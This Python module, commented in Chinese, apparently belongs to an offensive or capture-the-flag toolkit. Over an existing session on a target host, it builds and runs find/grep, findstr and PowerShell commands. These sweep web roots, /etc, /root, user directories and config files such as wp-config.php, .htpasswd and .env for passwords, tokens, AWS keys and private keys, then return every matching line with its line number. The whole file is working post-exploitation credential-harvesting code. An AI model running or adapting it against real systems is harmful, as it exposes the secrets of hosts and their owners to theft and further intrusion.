"""配置文件线索检索（M3 凭据线索检索）：经会话层在目标侧真实翻配置文件找口令 / Flag 等线索。

设计要点（与 probe.py 同风格）：
- 全部经 SessionBase.exec 在目标侧真实执行，解析真实回显（API 层零 subprocess）；
- 只扫文本类文件并限制大小与数量：排除二进制 / 大文件 / node_modules / /proc / /sys；
- 命中行号用 `grep -n` / `findstr /n` 的真实回显，不自己猜；
- 跨平台：Linux 用 find+grep，Windows 用 findstr；两边都要能跑；
- 结论不伪造：命令执行失败如实返回 ok:false + error，绝不编造命中；
- 敏感信息仅经 API 返回本地前端（不写日志、不落盘、不外发），符合 docs/ASSUMPTIONS.md A-23。
"""

from __future__ import annotations

import re
import shlex
from collections import defaultdict
from dataclasses import dataclass, field
from typing import Iterable

from ..session.base import SessionBase

#: Linux 默认检索根（不存在则 find 自动跳过，不报错）
DEFAULT_ROOTS_LINUX: list[str] = [
    "/var/www/html", "/var/www", "/opt", "/srv", "/etc", "/home", "/root",
    "/app", "/usr/local/tomcat", "/var/lib",
]

#: Windows 默认检索根（靶机常见 Web / 服务目录 + 用户目录）
DEFAULT_ROOTS_WINDOWS: list[str] = [
    r"C:\inetpub", r"C:\xampp", r"C:\wamp", r"C:\App", r"C:\ProgramData",
    r"C:\Users", r"C:\Windows\www", "D:\\", "E:\\",
]

#: 命中任一即算线索（顺序无关，解析时按长度降序匹配，优先更具体的词）
DEFAULT_KEYWORDS: list[str] = [
    "pass", "password", "passwd", "pwd", "secret", "token", "apikey", "api_key",
    "access_key", "credential", "user", "admin", "jdbc", "mysql://", "redis",
    "PRIVATE KEY", "AKIA",
]

#: 只扫这些文本 / 配置类扩展名（缩小面，避免翻进二进制与海量日志）
_TEXT_EXT: tuple[str, ...] = (
    "php", "inc", "phtml", "pht", "conf", "cfg", "ini", "env", "yml", "yaml",
    "json", "xml", "sql", "sh", "bash", "py", "pyw", "properties", "config",
    "txt", "htm", "html", "js", "mjs", "cjs", "css", "csv", "ts", "tsx", "tmpl",
    "tpl", "bat", "cmd", "ps1", "asp", "aspx", "jsp", "jspx", "java", "rb", "go",
    "cnf", "toml", "lock", "gradle", "tf", "tfvars", "vim", "editorconfig",
    "dist", "conf",
)

#: 「带目录名过滤」兜底：用 find 找常见配置文件名（覆盖非常规扩展名的配置）
_CONFIG_NAMES: tuple[str, ...] = (
    "config.*", "*.env", "*.env.*", "wp-config.php", "web.config",
    "appsettings.json", "appsettings.*.json", "application.properties",
    "application.yml", "application.yaml", "application.conf", "settings.py",
    "settings.local.php", "local.py", "local_settings.py", ".htpasswd",
    "secrets.*", "secret.*", "credentials*", "credential*", "database.yml",
    "database.php", "database.conf", "db.php", "ops.php", "conn*.php",
    "connection*.php", "constants.php", "*.npmrc", ".gitconfig",
)

#: 排除的二进制 / 大体积扩展名
_BINARY_EXT: tuple[str, ...] = (
    "pyc", "pyo", "class", "jar", "war", "so", "dll", "exe", "png", "jpg",
    "jpeg", "gif", "ico", "webp", "bmp", "zip", "gz", "tgz", "tar", "bz2",
    "7z", "rar", "pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "mp3",
    "mp4", "avi", "woff", "woff2", "ttf", "eot", "bin", "dat", "o", "a",
)

#: 排除的目录（node_modules 体积爆炸；/proc / /sys 是虚拟文件系统）
_EXCLUDE_DIRS: tuple[str, ...] = ("node_modules", ".git", ".svn", "proc", "sys")

#: 单文件体积上限（KB）：超过视为非配置文本，跳过
SIZE_CAP_KB: int = 500
#: 单文件最多取多少条命中（避免一个超大配置把结果撑爆）
PER_FILE_CAP: int = 30
#: 单文件 grep 的 --max-count（目标侧就截断，省带宽）
_PER_FILE_GREP_CAP: int = 50


@dataclass
class ClueHit:
    """单条命中：真实行号 + 行内容 + 命中的关键词。"""

    line: int
    text: str
    keyword: str

    def to_dict(self) -> dict:
        return {"line": self.line, "text": self.text, "keyword": self.keyword}


@dataclass
class ClueItem:
    """一个文件里的全部命中（含文件大小）。"""

    file: str
    size: int = 0
    hits: list[ClueHit] = field(default_factory=list)

    def to_dict(self) -> dict:
        return {"file": self.file, "size": self.size,
                "hits": [h.to_dict() for h in self.hits]}


@dataclass
class ClueReport:
    """检索结果（与前端契约一致，to_dict 即 API 返回体）。"""

    ok: bool = True
    items: list[ClueItem] = field(default_factory=list)
    summary: dict = field(default_factory=dict)
    error: str = ""

    def to_dict(self) -> dict:
        return {
            "ok": self.ok,
            "items": [i.to_dict() for i in self.items],
            "summary": self.summary,
            "error": self.error,
        }


#: 解析 grep/findstr 回显：file:line:text（Windows 路径的盘符冒号由非贪婪匹配自动越过）
_LINE_RE = re.compile(r"^(.*?):(\d+):(.*)$", re.DOTALL)


def _match_keyword(text: str, keywords: list[str]) -> str:
    """返回 text 命中的关键词：取文本中**最靠左**出现者（更直观），位置并列时优先更具体的词。"""
    low = (text or "").lower()
    best: tuple[int, int, str] | None = None  # (出现位置, -长度, 关键词)
    for kw in keywords:
        idx = low.find(kw.lower())
        if idx < 0:
            continue
        cand = (idx, -len(kw), kw)
        if best is None or cand < best:
            best = cand
    return best[2] if best is not None else ""


def _parse_grep(out: str, keywords: list[str]) -> list[tuple[str, int, str, str]]:
    """解析 grep -n / findstr /n 回显 → [(文件, 行号, 文本, 关键词)]。"""
    hits: list[tuple[str, int, str, str]] = []
    for raw in (out or "").splitlines():
        m = _LINE_RE.match(raw.rstrip("\r"))
        if not m:
            continue
        f, ln, txt = m.group(1), int(m.group(2)), m.group(3)
        kw = _match_keyword(txt, keywords)
        if not kw:
            continue
        hits.append((f, ln, txt, kw))
    return hits


def _parse_enum_linux(out: str) -> tuple[dict[str, int], int]:
    """解析 `find ... -exec stat -c '%s %p' {} +` 回显 → (路径->字节数, 扫描文件数)。"""
    sizes: dict[str, int] = {}
    for line in (out or "").splitlines():
        m = re.match(r"^\s*(\d+)\s+(.*)$", line.rstrip("\r"))
        if not m:
            continue
        sizes[m.group(2).strip()] = int(m.group(1))
    return sizes, len(sizes)


# ---------------------------------------------------------------------------
# 命令构造（跨平台）
# ---------------------------------------------------------------------------

def _linux_enum_cmd(roots: list[str], size_kb: int) -> str:
    """列出候选配置文件（大小+路径），用于 filesScanned 计数与后续取 size。"""
    names = [f"-name '*.{e}'" for e in _TEXT_EXT]
    names += [f"-name '{c}'" for c in _CONFIG_NAMES]
    name_group = "\\( " + " -o ".join(names) + " \\)"
    excl = " ".join(f"! -name '*.{b}'" for b in _BINARY_EXT)
    excl += " " + " ".join(f"! -path '*/{d}/*'" for d in _EXCLUDE_DIRS)
    roots_q = " ".join(shlex.quote(r) for r in roots)
    return (f"find {roots_q} -type f {name_group} {excl} -size -{size_kb}k "
            f"-exec stat -c '%s %p' {{}} + 2>/dev/null")


def _linux_grep_cmd(roots: list[str], pattern: str, per_cap: int, size_kb: int) -> str:
    """find 候选文件 → xargs grep 关键词（带真实行号，目标侧就截断单文件命中）。"""
    names = [f"-name '*.{e}'" for e in _TEXT_EXT]
    names += [f"-name '{c}'" for c in _CONFIG_NAMES]
    name_group = "\\( " + " -o ".join(names) + " \\)"
    excl = " ".join(f"! -name '*.{b}'" for b in _BINARY_EXT)
    excl += " " + " ".join(f"! -path '*/{d}/*'" for d in _EXCLUDE_DIRS)
    roots_q = " ".join(shlex.quote(r) for r in roots)
    find = (f"find {roots_q} -type f {name_group} {excl} -size -{size_kb}k "
            f"-print0 2>/dev/null")
    grep = (f"xargs -0 grep -In -E --max-count={per_cap} -e '{pattern}' 2>/dev/null")
    return find + " | " + grep


def _windows_cmd(roots: list[str], pattern: str) -> str:
    """Windows：findstr 递归正则检索（/p 跳过含不可打印字符的二进制文件）。"""
    specs = " ".join(f'"{r.rstrip("/\\")}\\*"' for r in roots)
    return f'findstr /s /i /n /p /r "{pattern}" {specs} 2>nul'


def _windows_sizes_cmd(files: Iterable[str]) -> str:
    """Windows：按命中文件取字节数（powershell，错误静默）。"""
    paths = "', '".join(files)
    return (f"powershell -NoP -NonI -Command "
            f"\"Get-ChildItem -LiteralPath '{paths}' -ErrorAction SilentlyContinue "
            f"| ForEach-Object {{ ($_.Length, $_.FullName) -join '|' }}\"")


def _linux_sizes_cmd(files: Iterable[str]) -> str:
    """Linux：wc -c 批量取字节数。"""
    return "wc -c " + " ".join(shlex.quote(f) for f in files) + " 2>/dev/null"


def _parse_sizes(out: str, platform: str) -> dict[str, int]:
    """解析 size 命令回显 → 路径->字节数。"""
    sizes: dict[str, int] = {}
    for line in (out or "").splitlines():
        line = line.rstrip("\r")
        if platform == "windows":
            m = re.match(r"^(\d+)\|(.*)$", line)
        else:
            # wc -c 末行是总计（以 " total" 结尾），跳过
            if line.rstrip().endswith("total"):
                continue
            m = re.match(r"^\s*(\d+)\s+(.*)$", line)
        if not m:
            continue
        sizes[m.group(2).strip()] = int(m.group(1))
    return sizes


# ---------------------------------------------------------------------------
# 主入口
# ---------------------------------------------------------------------------

def search_clues(session: SessionBase,
                 roots: list[str] | None = None,
                 keywords: list[str] | None = None,
                 max_files: int = 200, max_hits: int = 300,
                 timeout: float = 30.0) -> dict:
    """在目标侧翻配置文件找口令 / Flag 等线索（真实执行，不伪造）。

    返回结构：{"ok", "items", "summary", "error"}，items 内每个文件含 size 与按真实行号
    排列的 hits。命令执行失败如实返回 ok:false + error。
    """
    platform = getattr(session, "platform", "linux") or "linux"
    keywords = list(keywords) if keywords else list(DEFAULT_KEYWORDS)
    if not keywords:
        return ClueReport(ok=False, error="关键词为空，无可检索内容").to_dict()
    roots = list(roots) if roots else (
        list(DEFAULT_ROOTS_WINDOWS) if platform == "windows" else list(DEFAULT_ROOTS_LINUX))
    if not roots:
        return ClueReport(ok=False, error="检索根目录为空").to_dict()

    per_cap = min(PER_FILE_CAP, max(1, max_hits))
    grep_cap = max(10, min(_PER_FILE_GREP_CAP, max_hits))
    pattern = "|".join(re.escape(k) for k in keywords)

    # 1) 真实执行检索
    if platform == "windows":
        enum_sizes: dict[str, int] = {}
        files_scanned = 0
        res = session.exec(_windows_cmd(roots, pattern), timeout=timeout)
    else:
        # Linux：先枚举候选文件（拿 filesScanned 与 size 映射），再 grep
        enum = session.exec(_linux_enum_cmd(roots, SIZE_CAP_KB), timeout=timeout)
        enum_sizes, files_scanned = _parse_enum_linux(enum.output)
        res = session.exec(
            _linux_grep_cmd(roots, pattern, grep_cap, SIZE_CAP_KB), timeout=timeout)

    if not res.ok:
        # 传输层 / 解析层失败：如实返回，绝不编造命中
        err = getattr(res, "error", "") or "目标侧命令执行失败（无回显 / 被拦截）"
        return ClueReport(
            ok=False, error=err,
            summary={"filesScanned": files_scanned, "filesHit": 0, "hitCount": 0,
                     "roots": roots, "keywords": keywords}).to_dict()

    # 2) 解析命中（file, line, text, keyword）
    raw_hits = _parse_grep(res.output, keywords)
    seen: set[tuple[str, int]] = set()
    by_file: dict[str, list[tuple[int, str, str]]] = defaultdict(list)
    for f, ln, txt, kw in raw_hits:
        key = (f, ln)
        if key in seen:
            continue
        seen.add(key)
        by_file[f].append((ln, txt, kw))

    # 3) 限流：单文件截断 → 限文件数 → 限总命中数
    items: list[ClueItem] = []
    hit_count = 0
    for f in list(by_file)[:max_files]:
        if hit_count >= max_hits:
            break
        # 同一文件内的命中按真实行号升序（与示例顺序一致，便于阅读）
        hl = sorted(by_file[f], key=lambda x: x[0])[:per_cap]
        taken = hl[: max(0, max_hits - hit_count)]
        hit_count += len(taken)
        items.append(ClueItem(
            file=f,
            size=enum_sizes.get(f, 0),
            hits=[ClueHit(line=ln, text=txt, keyword=kw) for ln, txt, kw in taken]))

    # Windows 补 size：只对命中文件取一次
    if platform == "windows" and items:
        sres = session.exec(
            _windows_sizes_cmd([it.file for it in items]), timeout=timeout)
        if sres.ok:
            sizes = _parse_sizes(sres.output, "windows")
            for it in items:
                it.size = sizes.get(it.file, 0)
            files_scanned = len(sizes)

    return ClueReport(
        ok=True, items=items,
        summary={"filesScanned": files_scanned, "filesHit": len(items),
                 "hitCount": hit_count, "roots": roots, "keywords": keywords},
        error="").to_dict()
